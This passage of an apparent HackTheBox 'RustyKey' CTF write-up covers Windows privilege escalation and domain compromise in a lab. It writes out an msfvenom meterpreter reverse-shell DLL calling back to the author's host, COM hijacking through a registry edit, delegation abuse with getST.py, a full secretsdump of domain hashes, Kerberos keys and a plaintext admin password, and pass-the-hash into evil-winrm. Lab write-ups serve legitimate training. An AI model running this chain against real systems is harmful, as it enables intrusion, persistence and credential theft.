+HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}
+    (Default)    REG_SZ    7-Zip Shell Extension
+
+HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
+    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll
+    ThreadingModel    REG_SZ    Apartment
+</code></pre>
+    </div>
+  </div>
+  
+<p>The <code>InprocServer32</code> key points to the legitimate DLL. The &ldquo;extended access&rdquo; from the memo gave me the permissions needed to modify this key.</p>
+<p>First, I generated a malicious DLL with <code>msfvenom</code>:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">msfvenom</span> <span class="flag">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.157 LPORT=9002 <span class="flag">-f</span> dll <span class="flag">-o</span> 7shit.dll
+Warning: KRB5CCNAME environment variable not supported - unsetting
+[<span>-</span>] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[<span>-</span>] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 9216 bytes
+Saved as: 7shit.dll
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>I then upload this <code>7shit.dll</code> to <code>C:\ProgramData</code> using WinRM session from bb.morgan. Then setup a listener on metasploit with the same payload:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">msfconsole</span> <span class="flag">-q</span> <span class="flag">-x</span> <span class="string">'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 9002; run'</span>
+<span class="indicator-info">[*]</span> Using configured payload generic/shell_reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+LHOST => tun0
+LPORT => 9002
+<span class="indicator-info">[*]</span> Started reverse TCP handler on 10.10.14.157:9002 
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>I uploaded this DLL to <code>C:\ProgramData\</code> and set up a Metasploit listener. Finally, from my <code>ee.reed</code> shell, I modified the registry to point to my malicious DLL:</p>
+<div class="terminal powershell">
+    <div class="terminal-header">
+      <div class="window-controls">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+      </div>
+      <div class="terminal-title">C:\Users\0xblivion&gt;</div>
+    </div>
+    <div class="terminal-content">
+      <pre><code>
+PS C:\Windows> cmd.exe /c 'reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /v "" /t REG_SZ /d "C:\ProgramData\7shit.dll" /f'
+The operation completed successfully.
+
+</code></pre>
+    </div>
+  </div>
+  
+<p>A few moments later, my Metasploit listener caught a shell from <code>mm.turner</code>:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="indicator-info">[*]</span> Started reverse TCP handler on 10.10.14.157:9002 
+<span class="indicator-info">[*]</span> Meterpreter session 1 opened (10.10.14.157:9002 -> 10.10.11.75:...) 
+meterpreter > getuid
+Server username: RUSTYKEY\mm.turner
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>Success! I escalated my privileges to <code>mm.turner</code>.</p>
+<hr>
+<h1 id="domain-dominance-ta0004">Domain Dominance (TA0004)<a hidden class="anchor" aria-hidden="true" href="#domain-dominance-ta0004">#</a></h1>
+<h3 id="resource-based-constrained-delegation-t1558003">Resource-Based Constrained Delegation (T1558.003)<a hidden class="anchor" aria-hidden="true" href="#resource-based-constrained-delegation-t1558003">#</a></h3>
+<p>Remember from the BloodHound analysis, <code>mm.turner</code> is in the <code>DelegationManager</code> group. This means I can allow a principal I control (the <code>IT-Computer3$</code> machine account) to impersonate other users to the DC.</p>
+<p>From my Meterpreter shell, I used PowerShell to modify the DC&rsquo;s <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute, granting delegation rights to <code>IT-Computer3$</code>.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+meterpreter > shell
+Process 3592 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.7434]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows> Set-ADComputer <span class="flag">-Identity</span> DC <span class="flag">-PrincipalsAllowedToDelegateToAccount</span> IT-COMPUTER3$
+PS C:\Windows> 
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>With the RBCD rule in place, I used <code>getST.py</code> to get a service ticket for <code>backupadmin</code> (since <code>administrator</code> is a protected user).</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">getST.py</span> <span class="flag">-dc-ip</span> $target <span class="flag">-impersonate</span> administrator <span class="flag">-k</span> <span class="flag">-spn</span> cifs/DC.rustykey.htb <span class="string">'rustykey.htb/IT-COMPUTER3$'</span>:'Rusty88!'
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="indicator-info">[*]</span> Impersonating administrator
+<span class="indicator-info">[*]</span> Requesting S4U2self
+<span class="indicator-info">[*]</span> Requesting S4U2Proxy
+<span class="indicator-error">[-]</span> Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
+<span class="indicator-error">[-]</span> Probably SPN is not allowed to delegate by user IT-COMPUTER3$ or initial TGT not forwardable
+
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">getST.py</span> <span class="flag">-dc-ip</span> $target <span class="flag">-impersonate</span> backupadmin <span class="flag">-k</span> <span class="flag">-spn</span> cifs/DC.rustykey.htb <span class="string">'rustykey.htb/IT-COMPUTER3$'</span>:'Rusty88!'  
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="indicator-info">[*]</span> Impersonating backupadmin
+<span class="indicator-info">[*]</span> Requesting S4U2self
+<span class="indicator-info">[*]</span> Requesting S4U2Proxy
+<span class="indicator-info">[*]</span> Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<h3 id="dumping-credentials-t1003003">Dumping Credentials (T1003.003)<a hidden class="anchor" aria-hidden="true" href="#dumping-credentials-t1003003">#</a></h3>
+<p>This gave me a service ticket for <code>backupadmin</code>. I exported this ticket and used it with <code>secretsdump.py</code> to dump all the domain hashes from the NTDS.dit file.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">secretsdump.py</span> <span class="flag">-k</span> <span class="flag">-no-pass</span> rustykey.htb/backupadmin@dc.rustykey.htb
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies
+
+[<span>*</span>] Service RemoteRegistry is in stopped state
+[<span>*</span>] Starting service RemoteRegistry
+[<span>*</span>] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4
+[<span>*</span>] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[<span>*</span>] Dumping cached domain logon information (domain/username:hash)
+[<span>*</span>] Dumping LSA Secrets
+[<span>*</span>] $MACHINE.ACC
+RUSTYKEY\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25
+RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
+[<span>*</span>] DefaultPassword
+RUSTYKEY\Administrator:Rustyrc4key#!
+[<span>*</span>] DPAPI_SYSTEM
+dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397
+dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c
+[<span>*</span>] NL$KM
+ 0000   6A 34 14 2E FC 1A C2 54  64 E3 4C F1 A7 13 5F 34   j4.....Td.L..._4
+ 0010   79 98 16 81 90 47 A1 F0  8B FC 47 78 8C 7B 76 B6   y....G....Gx.{v.
+ 0020   C0 E4 94 9D 1E 15 A6 A9  70 2C 13 66 D7 23 A1 0B   ........p,.f.#..
+ 0030   F1 11 79 34 C1 8F 00 15  7B DF 6F C7 C3 B4 FC FE   ..y4....{.o.....
+NL$KM:6a34142efc1ac25464e34cf1a7135f34799816819047a1f08bfc47788c7b76b6c0e4949d1e15a6a9702c1366d723a10bf1117934c18f00157bdf6fc7c3b4fcfe
+[<span>*</span>] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[<span>*</span>] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7a351e12f70cc177a1d5bd11b28ac26:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4ad30fa8d8f2cfa198edd4301e5b0f3:::
+rustykey.htb\rr.parker:1137:aad3b435b51404eeaad3b435b51404ee:d0c72d839ef72c7d7a2dae53f7948787:::
+rustykey.htb\mm.turner:1138:aad3b435b51404eeaad3b435b51404ee:7a35add369462886f2b1f380ccec8bca:::
+rustykey.htb\bb.morgan:1139:aad3b435b51404eeaad3b435b51404ee:44c72edbf1d64dc2ec4d6d8bc24160fc:::
+rustykey.htb\gg.anderson:1140:aad3b435b51404eeaad3b435b51404ee:93290d859744f8d07db06d5c7d1d4e41:::
+rustykey.htb\dd.ali:1143:aad3b435b51404eeaad3b435b51404ee:20e03a55dcf0947c174241c0074e972e:::
+rustykey.htb\ee.reed:1145:aad3b435b51404eeaad3b435b51404ee:4dee0d4ff7717c630559e3c3c3025bbf:::
+rustykey.htb\nn.marcos:1146:aad3b435b51404eeaad3b435b51404ee:33aa36a7ec02db5f2ec5917ee544c3fa:::
+rustykey.htb\backupadmin:3601:aad3b435b51404eeaad3b435b51404ee:34ed39bc39d86932b1576f23e66e3451:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
+Support-Computer1$:1103:aad3b435b51404eeaad3b435b51404ee:5014a29553f70626eb1d1d3bff3b79e2:::
+Support-Computer2$:1104:aad3b435b51404eeaad3b435b51404ee:613ce90991aaeb5187ea198c629bbf32:::
+Support-Computer3$:1105:aad3b435b51404eeaad3b435b51404ee:43c00d56ff9545109c016bbfcbd32bee:::
+Support-Computer4$:1106:aad3b435b51404eeaad3b435b51404ee:c52b0a68cb4e24e088164e2e5cf2b98a:::
+Support-Computer5$:1107:aad3b435b51404eeaad3b435b51404ee:2f312c564ecde3769f981c5d5b32790a:::
+Finance-Computer1$:1118:aad3b435b51404eeaad3b435b51404ee:d6a32714fa6c8b5e3ec89d4002adb495:::
+Finance-Computer2$:1119:aad3b435b51404eeaad3b435b51404ee:49c0d9e13319c1cb199bc274ee14b04c:::
+Finance-Computer3$:1120:aad3b435b51404eeaad3b435b51404ee:65f129254bea10ac4be71e453f6cabca:::
+Finance-Computer4$:1121:aad3b435b51404eeaad3b435b51404ee:ace1db31d6aeb97059bf3efb410df72f:::
+Finance-Computer5$:1122:aad3b435b51404eeaad3b435b51404ee:b53f4333805f80406b4513e60ef83457:::
+IT-Computer1$:1123:aad3b435b51404eeaad3b435b51404ee:fe60afe8d9826130f0e06cd2958a8a61:::
+IT-Computer2$:1124:aad3b435b51404eeaad3b435b51404ee:73d844e19c8df244c812d4be1ebcff80:::
+IT-Computer3$:1125:aad3b435b51404eeaad3b435b51404ee:b52b582f02f8c0cd6320cd5eab36d9c6:::
+IT-Computer4$:1126:aad3b435b51404eeaad3b435b51404ee:763f9ea340ccd5571c1ffabf88cac686:::
+IT-Computer5$:1127:aad3b435b51404eeaad3b435b51404ee:1679431d1c52638688b4f1321da14045:::
+[<span>*</span>] Kerberos keys grabbed
+Administrator:des-cbc-md5:e007705d897310cd
+krbtgt:aes256-cts-hmac-sha1-96:ee3271eb3f7047d423c8eeaf1bd84f4593f1f03ac999a3d7f3490921953d542a
+krbtgt:aes128-cts-hmac-sha1-96:24465a36c2086d6d85df701553a428af
+krbtgt:des-cbc-md5:d6d062fd1fd32a64
+rustykey.htb\rr.parker:des-cbc-md5:8c5b3b54b9688aa1
+rustykey.htb\mm.turner:aes256-cts-hmac-sha1-96:707ba49ed61c6575bfe9a3fd1541fc008e8803bfb0d7b5d21122cc464f39cbb9
+rustykey.htb\mm.turner:aes128-cts-hmac-sha1-96:a252d2716a0b365649eaec02f84f12c8
+rustykey.htb\mm.turner:des-cbc-md5:a46ea77c13854945
+rustykey.htb\bb.morgan:des-cbc-md5:d6ef5e57a2abb93b
+rustykey.htb\gg.anderson:des-cbc-md5:8923850da84f2c0d
+rustykey.htb\dd.ali:des-cbc-md5:613da45e3bef34a7
+rustykey.htb\ee.reed:des-cbc-md5:2fc46d9b898a4a29
+rustykey.htb\nn.marcos:aes256-cts-hmac-sha1-96:53ee5251000622bf04e80b5a85a429107f8284d9fe1ff5560a20ec8626310ee8
+rustykey.htb\nn.marcos:aes128-cts-hmac-sha1-96:cf00314169cb7fea67cfe8e0f7925a43
+rustykey.htb\nn.marcos:des-cbc-md5:e358835b1c238661
+rustykey.htb\backupadmin:des-cbc-md5:625e25fe70a77358
+DC$:des-cbc-md5:915d9d52a762675d
+Support-Computer1$:aes256-cts-hmac-sha1-96:89a52d7918588ddbdae5c4f053bbc180a41ed703a30c15c5d85d123457eba5fc
+Support-Computer1$:aes128-cts-hmac-sha1-96:3a6188fdb03682184ff0d792a81dd203
+Support-Computer1$:des-cbc-md5:c7cb8a76c76dfed9
+Support-Computer2$:aes256-cts-hmac-sha1-96:50f8a3378f1d75df813db9d37099361a92e2f2fb8fcc0fc231fdd2856a005828
+Support-Computer2$:aes128-cts-hmac-sha1-96:5c3fa5c32427fc819b10f9b9ea4be616
+Support-Computer2$:des-cbc-md5:a2a202ec91e50b6d
+Support-Computer3$:aes256-cts-hmac-sha1-96:e3b7b8876ac617dc7d2ba6cd2bea8de74db7acab2897525dfd284c43c8427954
+Support-Computer3$:aes128-cts-hmac-sha1-96:1ea036e381f3279293489c19cfdeb6c1
+Support-Computer3$:des-cbc-md5:c13edcfe4676f86d
+Support-Computer4$:aes256-cts-hmac-sha1-96:1708c6a424ed59dedc60e980c8f2ab88f6e2bb1bfe92ec6971c8cf5a40e22c1e
+Support-Computer4$:aes128-cts-hmac-sha1-96:9b6d33ef93c69721631b487dc00d3047
+Support-Computer4$:des-cbc-md5:3b79647680e0d57a
+Support-Computer5$:aes256-cts-hmac-sha1-96:464551486df4086accee00d3d37b60de581ee7adad2a6a31e3730fad3dfaed42
+Support-Computer5$:aes128-cts-hmac-sha1-96:1ec0c93b7f9df69ff470e2e05ff4ba89
+Support-Computer5$:des-cbc-md5:73abb53162d51fb3
+Finance-Computer1$:aes256-cts-hmac-sha1-96:a57ce3a3e4ee34bc08c8538789fa6f99f5e8fb200a5f77741c5bf61b3d899918
+Finance-Computer1$:aes128-cts-hmac-sha1-96:e62b7b772aba6668af65e9d1422e6aea
+Finance-Computer1$:des-cbc-md5:d9914cf29e76f8df
+Finance-Computer2$:aes256-cts-hmac-sha1-96:4d45b576dbd0eab6f4cc9dc75ff72bffe7fae7a2f9dc50b5418e71e8dc710703
+Finance-Computer2$:aes128-cts-hmac-sha1-96:3fd0dd200120ca90b43af4ab4e344a78
+Finance-Computer2$:des-cbc-md5:23ef512fb3a8d37c
+Finance-Computer3$:aes256-cts-hmac-sha1-96:1b2280d711765eb64bdb5ab1f6b7a3134bc334a3661b3335f78dd590dee18b0d
+Finance-Computer3$:aes128-cts-hmac-sha1-96:a25859c88f388ae7134b54ead8df7466
+Finance-Computer3$:des-cbc-md5:2a688a43ab40ecba
+Finance-Computer4$:aes256-cts-hmac-sha1-96:291adb0905f3e242748edd1c0ecaab34ca54675594b29356b90da62cf417496f
+Finance-Computer4$:aes128-cts-hmac-sha1-96:81fed1f0eeada2f995ce05bbf7f8f951
+Finance-Computer4$:des-cbc-md5:6b7532c83bc84c49
+Finance-Computer5$:aes256-cts-hmac-sha1-96:6171c0240ae0ce313ecbd8ba946860c67903b12b77953e0ee38005744507e3de
+Finance-Computer5$:aes128-cts-hmac-sha1-96:8e6aa26b24cdda2d7b5474b9a3dc94dc
+Finance-Computer5$:des-cbc-md5:92a72f7f865bb6cd
+IT-Computer1$:aes256-cts-hmac-sha1-96:61028ace6c840a6394517382823d6485583723f9c1f98097727ad3549d833b1e
+IT-Computer1$:aes128-cts-hmac-sha1-96:7d1a98937cb221fee8fcf22f1a16b676
+IT-Computer1$:des-cbc-md5:019d29370ece8002
+IT-Computer2$:aes256-cts-hmac-sha1-96:e9472fb1cf77df86327e5775223cf3d152e97eebd569669a6b22280316cf86fa
+IT-Computer2$:aes128-cts-hmac-sha1-96:a80fba15d78f66477f0591410a4ffda7
+IT-Computer2$:des-cbc-md5:622f2ae961abe932
+IT-Computer3$:aes256-cts-hmac-sha1-96:7871b89896813d9e4a732a35706fe44f26650c3da47e8db4f18b21cfbb7fbecb
+IT-Computer3$:aes128-cts-hmac-sha1-96:0e14a9e6fd52ab14e36703c1a4c542e3
+IT-Computer3$:des-cbc-md5:f7025180cd23e5f1
+IT-Computer4$:aes256-cts-hmac-sha1-96:68f2e30ca6b60ec1ab75fab763087b8772485ee19a59996a27af41a498c57bbc
+IT-Computer4$:aes128-cts-hmac-sha1-96:181ffb2653f2dc5974f2de924f0ac24a
+IT-Computer4$:des-cbc-md5:bf58cb437340cd3d
+IT-Computer5$:aes256-cts-hmac-sha1-96:417a87cdc95cb77997de6cdf07d8c9340626c7f1fbd6efabed86607e4cfd21b8
+IT-Computer5$:aes128-cts-hmac-sha1-96:873fd89f24e79dcd0affe6f63c51ec9a
+IT-Computer5$:des-cbc-md5:ad5eec6bcd4f86f7
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<h3 id="final-shell-as-system-t1078">Final Shell as SYSTEM (T1078)<a hidden class="anchor" aria-hidden="true" href="#final-shell-as-system-t1078">#</a></h3>
+<p>With the Administrator&rsquo;s NTLM hash (<code>f7a351e12f70cc177a1d5bd11b28ac26</code>), I can perform a pass-the-hash attack to get a Kerberos Ticket Granting Ticket (TGT).</p>
+<p>First, I use <code>getTGT.py</code> with the hash:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">getTGT.py</span> rustykey.htb/administrator <span class="flag">-no-pass</span> <span class="flag">-hashes</span> :f7a351e12f70cc177a1d5bd11b28ac26
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="indicator-info">[*]</span> Saving ticket in administrator.ccache
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>Now, with the ticket saved, I can use it with <code>evil-winrm</code> to perform a pass-the-ticket attack and get a shell as SYSTEM.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">KRB5CCNAME=administrator.ccache</span> evil-winrm <span class="flag">-i</span> dc.rustykey.htb <span class="flag">-r</span> rustykey.htb
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span style="color: red;">*Evil-WinRM*</span> <span style="color: orange; font-weight: bold">PS</span> PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
+160005dfd79468f459596ebccca4dbb5
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+Root flag: 160005dfd79468f459596ebccca4dbb5
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/posts/htb/linux/medium/hackthebox-cat-writeup/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>HackTheBox - Cat Writeup</span>
+  </a>
+  <a class="next" href="http://localhost:1313/posts/thm/insane/tryhackme-crocccrew-writeup/">
+    <span class="title">Next »</span>
+    <br>
+    <span></span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">0xblivion.dev</a></span>
+
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
